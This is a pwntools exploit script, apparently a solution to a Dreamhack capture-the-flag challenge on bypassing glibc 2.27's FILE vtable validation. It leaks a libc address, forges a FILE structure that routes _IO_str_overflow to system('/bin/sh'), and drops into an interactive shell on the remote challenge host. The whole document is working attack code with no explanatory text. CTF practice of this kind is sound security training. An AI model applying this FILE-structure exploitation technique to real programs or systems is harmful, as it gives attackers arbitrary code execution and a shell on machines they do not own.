#!/usr/bin/env python3

from pwn import *

exe = ELF("./bypass_valid_vtable_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 18451)

    return r


def main():
    r = conn()

    r.recvuntil(b"stdout: ")
    _io_2_1_stdout_ = int(r.recvline()[:-1], 16)

    libc_base = _io_2_1_stdout_ - libc.symbols["_IO_2_1_stdout_"]
    
    binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
    _io_str_overflow = libc_base + libc.symbols["_IO_file_jumps"] + 0xd8
    system = libc_base + libc.symbols["system"] 
    fp = exe.symbols["fp"]

    payload = p64(0)                                        # _flags
    payload += p64(0)                                       # _IO_read_ptr
    payload += p64(0)                                       # _IO_read_end
    payload += p64(0)                                       # _IO_read_base
    payload += p64(0)                                       # _IO_write_base
    payload += p64(binsh // 2 - 50)                         # _IO_write_ptr
    payload += p64(0)                                       # _IO_write_end
    payload += p64(0)                                       # _IO_buf_base
    payload += p64(binsh // 2 - 50)                         # _IO_buf_end
    payload += p64(0)                                       # _IO_save_base
    payload += p64(0)                                       # _IO_backup_base
    payload += p64(0)                                       # _IO_save_end
    payload += p64(0)                                       # _markers
    payload += p64(0)                                       # _chain
    payload += p64(1)                                       # _fileno
    payload += p64(0)                                       # _old_offset
    payload += p64(0)                                    
    payload += p64(fp + 0x80)                               # _lock
    payload += p64(0) * 9                                       
    payload += p64(_io_str_overflow - 16)                   # vtable     
    payload += p64(system)                                  # _allocate_buffer

    r.sendafter(b"Data: ", payload)

    r.interactive()


if __name__ == "__main__":
    main()
